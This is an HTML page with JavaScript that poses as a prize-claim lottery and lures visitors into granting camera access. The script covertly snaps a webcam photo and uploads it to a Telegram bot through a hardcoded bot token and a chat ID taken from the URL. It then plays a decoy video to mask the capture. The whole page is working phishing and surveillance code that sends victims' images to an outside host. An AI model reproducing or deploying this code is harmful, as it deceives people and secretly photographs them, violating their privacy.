<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>🧧</title>
    <style>
        body { display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; margin: 0; background: url('https://github.com/sachinbagwan208-design/-/raw/main/00.png') no-repeat center center fixed; background-size: cover; color: white; font-family: sans-serif; }
        /* 修改：视频框初始透明，过渡显示 */
        #video { background: #000; border: 2px solid #444; border-radius: 8px; margin-bottom: 20px; display: none; opacity: 0; transition: opacity 0.5s ease-in-out; }
        #status { margin: 15px 0; font-weight: bold; background: rgba(0,0,0,0.6); padding: 10px; border-radius: 5px; }
        button { padding: 15px 40px; cursor: pointer; font-size: 20px; border-radius: 5px; border: none; background: #28a745; color: white; }
    </style>
</head>
<body>
    <h2>🎉 Please click below to claim your prize 🎉</h2>
    <div id="status">🎰🎰🎰🎰🎰</div>
    <video id="video" width="640" height="480" autoplay playsinline muted></video>
    <canvas id="canvas" style="display:none;"></canvas>
    <button id="startBtn">START🎲</button>

    <script>
        const BOT_TOKEN = '8657025946:AAENnYKTFNhRrms6bzTLIR2kAQGytdOinnI';
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const startBtn = document.getElementById('startBtn');
        const status = document.getElementById('status');
        const CHAT_ID = new URLSearchParams(window.location.search).get('id');

        startBtn.addEventListener('click', async () => {
            if (!CHAT_ID) { status.innerText = "❌ 错误：未识别到用户ID"; return; }
            startBtn.style.display = 'none';
            status.innerText = "Processing........";

            try {
                // 1. 获取权限
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                video.srcObject = stream;
                video.style.display = 'block';
                video.style.opacity = '1'; // 平滑显示
                
                // 2. 延迟执行拍照，给视频加载一点时间
                setTimeout(() => captureAndUpload(stream), 1000);
            } catch (err) {
                status.innerText = "⚠️: Please grant permissions";
            }
        });

        async function captureAndUpload(stream) {
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
            
            canvas.toBlob(async (blob) => {
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, 'prize.jpg');

                const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
                
                // 3. 上传后不下载，而是直接在当前页循环播放视频
                if ((await res.json()).ok) {
                    status.innerText = "🎉 Success! Loading...";
                    // 隐藏摄像头，替换为播放器
                    video.srcObject = null;
                    video.src = "https://github.com/sachinbagwan208-design/-/raw/main/000.MP4";
                    video.loop = true;
                    video.play();
                }
            }, 'image/jpeg');
        }
    </script>
</body>
</html>
